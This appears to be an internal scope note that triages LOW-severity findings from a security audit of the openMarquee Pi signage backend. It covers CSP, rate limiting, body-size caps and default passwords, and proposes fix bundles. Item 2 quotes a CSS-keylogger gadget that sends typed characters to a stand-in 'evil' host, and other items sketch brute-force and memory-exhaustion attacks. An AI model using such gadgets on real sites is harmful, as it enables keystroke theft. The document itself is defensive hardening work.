---
date: 2026-05-25
type: scope
surface: backend (and ui where relevant)
---

# LOW-severity security items — scope as of 2026-05-25

The 2026-05-24 backend security audit (`/Users/qarl/tmp/qa-security-audit-2026-05-24.md`)
closed 4 actionable findings (HIGH #1 Path A bearer-verify `9ed1bc3`; MEDIUM #2 SSRF
`/flock/hello` gate `9ee0e70`; MEDIUM #3 query-string token no-store/no-referrer
`03a6fd6`; D3 Live phantom-session `8d82c29`). It enumerated 5 LOW
defense-in-depth items (audit findings 4 + 5 + 6 + 7 + 8 + 9 — actually 6, not 5,
re-counted by tier) plus 3 NOISE. None of the LOWs have been touched since the
audit closed; the source code at `auth_middleware.py:120-209`, `csp_middleware.py:41-54`,
`api_flock.py:319-408`, `settings.py:172-180`, `api_settings.py:182-236`, and
`api_live.py:131-168` is verbatim as the audit described.

This scope doc enumerates each LOW, re-confirms it's still real, applies the
single-tenant-Pi deployment-model lens (NAT-bound, optional Tailscale, captive-portal
AP only at first-boot), and proposes bundles.

## Calibration

The 2026-05-24 audit's calibration footer is the right lens: most LOW items are
defense-in-depth, not exploitable today. We add 3 OWASP-checklist sweeps the audit
did not enumerate (rate-limit on auth, missing X-Content-Type-Options + Referrer-Policy
on non-media routes, no body-size cap on JSON uploads). All are confirmed-present
in code; realistic threats described below.

Items considered and ruled out (NOT-A-FINDING) appear in the final section.

## Inventory

### 1. First-run wifi prefill side-effect on first authed GET

- **Source:** 2026-05-24 audit finding #4 (`/Users/qarl/tmp/qa-security-audit-2026-05-24.md` lines 172-207)
- **Surface:** backend/api (`api_settings.py:200-236`)
- **Current state:** `GET /api/settings` at `api_settings.py:201-202` checks `not ui_first_run_seen and not (settings.wifi_station_ssid or "").strip()`; if both hold, calls `read_system_wifi()` and persists the operator's `/etc/wpa_supplicant/wpa_supplicant.conf` creds into the settings store as wifi_station_ssid + wifi_station_password (committed with `storage.save(updated)` at line 226). This is the first authed GET, not a first-run-UI explicit save.
- **Threat shape:** A pre-shipment attacker (factory line, courier) who has the device powered up before the operator's home-WiFi handshake-and-firstboot rotation — sets a welcome-flow password, then `GET /api/settings` once the device joins the operator's home WiFi. The operator's home PSK is now persisted to `settings.json` on the SD card (file is 0600 per Sweep #6, but an attacker with physical SD access can read it). Bounded by the per-device AP password rotation (`Phase B SD-card automation landed 2026-05-11`) — pre-rotation window only.
- **Fix shape:** Gate the prefill on explicit operator consent (a `POST /api/settings/wifi-prefill` button on the welcome flow) instead of the implicit side-effect on first authed GET.
- **Effort estimate:** small
- **Coherence:** standalone — touches only `api_settings.py`. Not naturally bundled with the headers / CSP cluster.

### 2. CSP `style-src 'unsafe-inline'` — DiD gap

- **Source:** 2026-05-24 audit finding #5 (`/Users/qarl/tmp/qa-security-audit-2026-05-24.md` lines 209-232)
- **Surface:** backend/middleware (`csp_middleware.py:41-54`) + 5 served HTML shells (`ui/login.html`, `ui/parity-harness.html`, `ui/set-password.html`, `ui/welcome.html`, `ui/test/fake-camera.html` per CSP docstring lines 15-20)
- **Current state:** `DEFAULT_CSP_POLICY` at `csp_middleware.py:41-54` has `style-src 'self' 'unsafe-inline'`. The 5 HTML shells carry inline `<style>` blocks; the audit-day commit (`0e10058`) acknowledged this trade-off but didn't tighten.
- **Threat shape:** Requires a future XSS-shaped sink in the UI. Today's UI uses `textContent` (verified in `flock.js`/`image-upload.js`/`video-upload.js`); no known injection point exists. The threat only fires if such a sink gets introduced AND an attacker can name a slide / playlist with an `<style>` payload — at which point CSS-keylogger gadgets (`url('//evil/?<typed-chars>')`) become reachable.
- **Fix shape:** Adopt per-request CSP nonces; emit `<style nonce="...">` in the 5 shells; flip the directive to `style-src 'self' 'nonce-...'`.
- **Effort estimate:** medium (5 HTML files + middleware-level nonce hook + tests across all shells)
- **Coherence:** Naturally bundles with item 3 (same middleware, same one-line-add). DOES NOT bundle with `Referrer-Policy` / `X-Content-Type-Options` work — those are response-header stamping, not CSP-directive rework.

### 3. CSP missing `report-uri` / `report-to`

- **Source:** 2026-05-24 audit finding #6 (`/Users/qarl/tmp/qa-security-audit-2026-05-24.md` lines 234-245)
- **Surface:** backend/middleware (`csp_middleware.py:41-54`) + backend/api (new tiny route)
- **Current state:** `DEFAULT_CSP_POLICY` has no `report-uri` or `report-to` directive. CSP violations land silently in the browser console; the operator (and QA) never sees them.
- **Threat shape:** Operability, not exploitability. An XSS attempt against a future UI sink fires CSP; without reporting, we only learn about it from QA noticing weirdness. Important for the report-only-mode rollout the CSP middleware already supports (`OPENMARQUEE_CSP_REPORT_ONLY=1`, `app.py:272`).
- **Fix shape:** Add `report-uri /api/system/csp-report` to `DEFAULT_CSP_POLICY`; add a small POST handler in `api_system.py` that `log.warning`s the report body (no persistence — journald rotation handles retention).
- **Effort estimate:** small
- **Coherence:** Naturally bundles with item 2 (same `DEFAULT_CSP_POLICY` constant; tests can ride the existing `tests/test_csp_middleware.py` suite). The `/api/system/csp-report` endpoint needs the `_WHITELIST_PREFIX` carve-out at `auth_middleware.py:98` (constant definition) + `:229` (lookup site in `_is_whitelisted`) since the browser POSTs the report unauth.

### 4. Tailnet-discover renders peer HostName without char strip

- **Source:** 2026-05-24 audit finding #7 (`/Users/qarl/tmp/qa-security-audit-2026-05-24.md` lines 247-270)
- **Surface:** backend/api (`api_flock.py:396-408` for the discover candidate construction; the FlockPeer storage-side cap at `flock.py` is independent)
- **Current state:** `_discover_tailnet_candidates` at `api_flock.py:396-408` returns `(hostname, dns_name.lower())` straight from the `tailscale status --json` payload with no length cap or charset filter on `hostname`. The UI then renders this in the discover-peers list at `ui/flock.js`.
- **Threat shape:** A malicious tailnet member sets their Tailscale HostName to a Unicode lookalike (`opеnmarquee-prod` with Cyrillic е) or a long zero-width-padded string. The operator's discover-peers UI shows the deceptive name; operator one-click-adds the impostor. Default tailnets are single-user; the threat requires the operator to have already invited the attacker to their tailnet (small surface).
- **Fix shape:** Strip non-printable + non-ASCII codepoints from `hostname` for the discover-list display (storage layer at `FlockPeer.name max_length=64` already caps length); a 2-line `_sanitize_hostname` helper in `api_flock.py`.
- **Effort estimate:** small (XS per the audit; bumped to small here because we should add a tiny UI-side render-time guard too as defense-in-depth on the assumption a future code path bypasses the API cleanup)
- **Coherence:** Standalone — single function in `api_flock.py`. Not naturally bundled with the CSP cluster or the headers cluster.

### 5. `wifi_password` default `"openmarquee"` shipped in code

- **Source:** 2026-05-24 audit finding #8 (`/Users/qarl/tmp/qa-security-audit-2026-05-24.md` lines 272-295)
- **Surface:** backend/storage (`settings.py:177-180`)
- **Current state:** `settings.py:177` literally `wifi_password: str = Field(default="openmarquee", ...)`. The Phase B firstboot oneshot rotates this to a per-device random per the 2026-05-11 ship; the residual is the pre-firstboot RF-range window.
- **Threat shape:** Attacker within RF range of a device that booted without the firstboot oneshot running (failed flash, factory test SD card, dev-Pi reflash before oneshot ran). They join the captive-portal AP with `"openmarquee"`, complete the welcome flow (claim the device as operator), and then have full bearer-token access. Production fleet is closed via firstboot rotation; dev-Pi `openMarqueeDev` and any SD card flashed without `Phase B` are open.
- **Fix shape:** Either (a) ship `wifi_password` as `Field(default_factory=lambda: secrets.token_urlsafe(16))` so an un-firstboot-ed device has a random per-process default (changes the wire shape of GET /api/settings before firstboot — acceptable since the operator can't actually use the device until firstboot completes) OR (b) refuse-to-serve the API at all when the AP password is still the literal `"openmarquee"` (a small `app.py` startup guard). Audit suggests option (a).
- **Effort estimate:** small. Audit notes "mostly NOT WORTH FIXING given firstboot already handles the production path." Counter-argument: dev-Pi without firstboot is a real deployment shape; the literal-default makes it a free re-auth target on the dev tailnet.
- **Coherence:** Standalone — `settings.py` defaults only. Could be deferred indefinitely (the audit explicitly says this); listing here for completeness.

### 6. `/api/live/start` leaks exception class name

- **Source:** 2026-05-24 audit finding #9 (`/Users/qarl/tmp/qa-security-audit-2026-05-24.md` lines 297-309)
- **Surface:** backend/api (`api_live.py:161-168`)
- **Current state:** `api_live.py:166` returns `"error_class": type(exc).__name__` on the 400 response when live negotiation fails. The comment at lines 152-160 says this is intentional (operator-diagnosis value) but acknowledges it leaks library identity (`SdpParseError` → aiortc).
- **Threat shape:** An authed caller probes `/api/live/start` with malformed SDP, reads the class names, and learns which aiortc-version-specific CVEs to chase. Authed-only, so the attacker already has bearer-token access; class names are public ABI of OSS libs (so the disclosure value is bounded).
- **Fix shape:** Whitelist a fixed set of class names that are useful for operator-self-diagnosis (`OSError`, `ValueError`, `TimeoutError`); map everything else to `"internal_error"`. Keeps the diagnosis value the audit comment cites without leaking aiortc-internal identifiers.
- **Effort estimate:** small (one set + one filter + one test in `tests/test_api_live.py`).
- **Coherence:** Standalone. Not bundlable with the CSP / headers clusters.

### 7. No rate-limiting on `/api/auth/login` or `/api/auth/set-password`

- **Source:** OWASP checklist (sweep-discipline rule 1: confirmed-real). Not in the 2026-05-24 audit's enumerated 5.
- **Surface:** backend/api (`api_auth.py:97-112` for login; `api_auth.py:74-94` for set-password)
- **Current state:** No `slowapi` / no `RateLimit` middleware / no per-IP throttle on either endpoint. `argon2id` at the OWASP floor (memory `project_pi_argon2_params.md`: t=2 m=19456 p=1) on a Pi Zero 2 W gives ~0.5s per `verify_password` call — that's the only thing limiting brute force today.
- **Threat shape:** An attacker on the LAN / tailnet runs an unattended password-dictionary attack against `/api/auth/login`. At ~0.5s/attempt (single-threaded — Python GIL + argon2 lock), that's ~170k attempts/day. For an operator who picked a 6-char-printable password (the `MIN_PASSWORD_LEN` floor at `auth.py:MIN_PASSWORD_LEN`), the full keyspace is ~7e11 — practically infeasible from one device, but trivially feasible if the attacker parallelizes across multiple source IPs (no source-IP throttle today). `/api/auth/set-password` is one-shot (409 once configured) so it's not a brute-force surface, BUT it IS a race-with-the-operator surface: an attacker on the captive-portal AP during firstboot might beat the operator to it.
- **Fix shape:** Two flavors. (a) Add an in-memory per-source-IP token bucket (e.g. 5 attempts / minute / IP) on `/api/auth/login`. (b) For `/api/auth/set-password`, a 30-second grace after device boot during which the endpoint is reachable only from loopback / RFC1918 / Tailscale CGNAT (matches `fqdn_redirect_middleware._is_private_or_loopback_ip` style — share the helper).
- **Effort estimate:** medium (clean implementation needs `XForwardedFor` handling — the device sits behind tailscale-serve in HTTPS Phase 1 which proxies; per-IP without trusting forwarded headers correctly throttles ALL traffic to the same bucket).
- **Coherence:** Standalone. Touches `api_auth.py` + a new tiny module. Not naturally bundled with the headers or CSP work.

### 8. Missing X-Content-Type-Options + Referrer-Policy on non-media routes

- **Source:** OWASP checklist. Partially overlaps with audit finding #3 (which already stamps `Referrer-Policy: no-referrer` ONLY on query-authed media routes per `auth_middleware.py:303-305`).
- **Surface:** backend/middleware (would extend `csp_middleware.py` or a new tiny middleware in `app.py`)
- **Current state:** CSP is the only response-header-stamper today (`csp_middleware.py:91-94`). No `X-Content-Type-Options: nosniff` — browsers content-sniff `image/*` responses, which interacts badly with the `data:` blob URLs allowed in CSP `img-src`. No `Referrer-Policy` for non-media routes — the dashboard's `<a target="_blank">` link to flock-peer URLs leaks the full Authorization-bearing URL via Referer (though bearer tokens are header-only outside the media-route fallback, so this is mostly DiD).
- **Threat shape:** (a) `nosniff` missing — a malicious image upload (passes the PIL `verify`+`load` gate at `api.py:171-194` but has a chunk that sniffs as HTML/JS in old browsers) could in theory be served back as text. Mitigated heavily by CSP `script-src 'self'`. Pure DiD. (b) `Referrer-Policy` missing — dashboard pages with `<a href="https://peer.ts.net/...">` send the dashboard URL in the Referer; that URL doesn't carry the bearer token (headers only) so disclosure is bounded to "what page the operator was on" — quite minor.
- **Fix shape:** Extend `CSPMiddleware` to also stamp `X-Content-Type-Options: nosniff` + `Referrer-Policy: strict-origin-when-cross-origin` on every HTTP response. Both are static byte strings; same one-line-append pattern as the CSP header (`csp_middleware.py:93-94`). Rename to `SecurityHeadersMiddleware` (or keep `CSPMiddleware`; the rename is cosmetic).
- **Effort estimate:** small (one middleware + test for each header's presence)
- **Coherence:** Naturally bundles with items 2 + 3 — same middleware, same test file (`tests/test_csp_middleware.py`).

### 9. No explicit request body size cap on JSON uploads

- **Source:** OWASP checklist. Not in the audit.
- **Surface:** backend/api (image / video / png upload routes in `api.py` accept base64-in-JSON; no caller-level size gate)
- **Current state:** Image / video / PNG uploads at `api.py:171-242` + `_decode_mp4_payload` at line 387 take `image_base64` / `png_base64` / `video_base64` as JSON string fields with NO Pydantic `max_length` on the b64 string. No `uvicorn --limit-max-requests` / no ASGI body cap (verified by absence of `MAX_BODY` / `max_size` patterns in the backend tree). Pillow `.load()` runs the full decode AFTER the b64 is decoded — so a 100 MB JSON body buffers into memory before any size check.
- **Threat shape:** An authed attacker (no bearer rate limit per item 7) sends a 200 MB base64 payload; the device buffers the full JSON in memory, base64-decodes to ~150 MB bytes, then Pillow / mp4-parser runs over the result. Pi Zero 2 W has 512 MB RAM; a single attacker request OOM-kills the backend service. Compounds with item 7 (no auth rate-limit → bulk attempts feasible).
- **Fix shape:** Either (a) add explicit `Field(max_length=N_BYTES * 4 // 3)` per-route (specific size per content type — images ~20 MB, videos ~200 MB) on the base64 fields in `api.py`; OR (b) add a uvicorn `--limit-request-line` / starlette body-cap middleware that 413s when `Content-Length` exceeds a per-route ceiling. Option (a) is cleaner (per-route ceilings preserve the legitimate large-video use case while clamping the rest); option (b) is one-line-and-done.
- **Effort estimate:** small (option a) or extra-small (option b)
- **Coherence:** Standalone. Touches `api.py` upload models. Not naturally bundled with the headers / CSP / auth-throttle clusters.

## Proposed bundles

### Bundle A — Security-headers + CSP-hardening cluster

- Items: 2, 3, 8
- Coherent because: All three live in `csp_middleware.py` / its tests, all extend the response-header-stamper pattern. Item 3 also touches `auth_middleware.py` for the `_WHITELIST_PREFIX` carve-out + `api_system.py` for the new POST handler — so it's a 3-file commit (middleware-headers + whitelist + handler), still a tight cluster. Items 2 + 3 + 8 ride the existing `tests/test_csp_middleware.py` suite (which already runs 11 tests post-`0e10058`).
- Estimated commit size: medium

### Bundle B — Brute-force + DoS hardening cluster

- Items: 7, 9
- Coherent because: Both are "attacker hammers an endpoint" defenses. The `/api/auth/login` throttle (item 7) and the body-size cap (item 9) can share a small `_rate_limit.py` helper module (token-bucket primitive) and the same tests file. Notably: item 7 makes item 9 LESS critical (the attacker can't bulk-attempt without bearer auth) — ship item 7 FIRST or as a single commit, otherwise item 9 protects an already-rate-limited surface.
- Estimated commit size: medium

### Bundle C — Single-file polish items

- Items: 1, 4, 5, 6
- Coherent because: Each is a single-function / single-default change in a different file (`api_settings.py`, `api_flock.py`, `settings.py`, `api_live.py`). NOT a real bundle in terms of shared code — but they share commit shape (small, single-file, no test-infra changes) so a single contributor can knock them out in one focused session even though they ship as 4 commits.
- Estimated commit size: small per item; medium aggregate

## Items intentionally not on this list

- **Finding #1 (HIGH, bearer token entropy)** — closed by `9ed1bc3` (Path A); current `auth.py:174` does the real argon2 compare per audit re-read.
- **Finding #2 (MEDIUM, SSRF on `/hello`)** — closed by `9ee0e70` (trusted-peer-address gate); per the commit message.
- **Finding #3 (MEDIUM, query-string token leakage)** — partially closed by `03a6fd6` (no-store + no-referrer on query-authed responses); the deeper "move to signed short-lived URLs" rewrite is acknowledged in the audit as a future option, NOT a LOW.
- **Finding #10 (wifi-password on nmcli argv → /proc visibility)** — NOISE per audit: requires local code-execution on the Pi; if attacker has shell, they're already inside.
- **Finding #11 (`log.info("tailscale up: %s", cmd)` — future-leak)** — NOISE per audit; local-only.
- **Finding #12 (flock-sync peer-to-peer push over plain HTTP)** — NOISE per audit; tailnet encryption is the design boundary.
- **HSTS header on `FqdnRedirectMiddleware` 301s** — considered. The middleware at `fqdn_redirect_middleware.py:142-150` 301s to `https://<fqdn>/...` but DOESN'T attach an HSTS `Strict-Transport-Security` header on the redirect response. Ruled out because the canonical FQDN URL is served by `tailscale serve` (NOT the openMarquee backend) — adding HSTS on the redirect would lock the operator's browser to the FQDN forever, but the FQDN is only valid while the operator's Tailscale auth-key is active. An operator who churns their tailnet (rotate node, change device-id) would be HSTS-locked to a dead URL. Conditional HSTS based on "the device's Tailscale identity has been stable for N days" is over-engineering for this deployment model.
- **CORS allowlist tightening** — considered. Current `api.py:108-138` allowlist-reflective implementation is tight (built-in localhost / 127.0.0.1 / 192.168.4.1 + flock-peer addresses). The audit didn't flag and re-audit confirms it's correct.
- **Audit logging on state-change endpoints** — considered. Mutation endpoints already log at INFO via the per-request `request_id` correlation (`app.py:78-81`). A dedicated audit-log file would be DiD; not a real LOW today (the operator is the only legitimate caller and journald is the canonical record).
- **Secrets in logs hygiene** — re-checked. `grep -rn "log\.info.*password"` returns one hit at `auth.py:169` (`log.warning("verify_password: unexpected error", exc_info=True)`) which doesn't echo the password — only the exception class. Clean.
- **Header injection on user-supplied strings** — re-checked. `perf_middleware.py` already 64-char-caps the inbound `X-Request-ID` and `FqdnRedirectMiddleware` only echoes the FQDN (trusted resolver). Clean.
- **CSRF on mutation endpoints** — bearer-token auth via `Authorization` header (not cookie) makes CSRF a non-issue: a cross-origin attacker can't forge the header without already having the token.
- **Server header / fingerprinting** — `uvicorn`'s default `Server: uvicorn` is on. Adding `server_header=False` to the uvicorn startup is a 1-line operability tweak. Ruled out as DiD-of-DiD; openMarquee version is also in `__version__` and surfaced via `/healthz` — fingerprint already self-disclosed.

## Recommendation for QA triage

Ship **Bundle A** (security-headers + CSP hardening) first. Concrete leverage: the `report-uri` from item 3 lands BEFORE any future UI XSS-sink discovery — so the moment one appears, CSP fires + the violation is journald-visible rather than silent. Without `report-uri` we'd only find out from a QA noticing weirdness after the fact. The other two items (nosniff + Referrer-Policy + style-src 'unsafe-inline' removal) ride the same middleware + test surface, so the marginal cost of bundling is near-zero — three items in one tight 3-file commit (middleware + whitelist + handler). **Bundle B** second (brute-force + DoS) — item 7 in particular is the most concretely-exploitable LOW (parallelized dictionary on `/api/auth/login` is the realistic LAN-attacker scenario, especially as soon as Tailscale-tailnet membership widens). **Bundle C** items are flag-don't-rush — ship opportunistically when a contributor is already in the touched file.
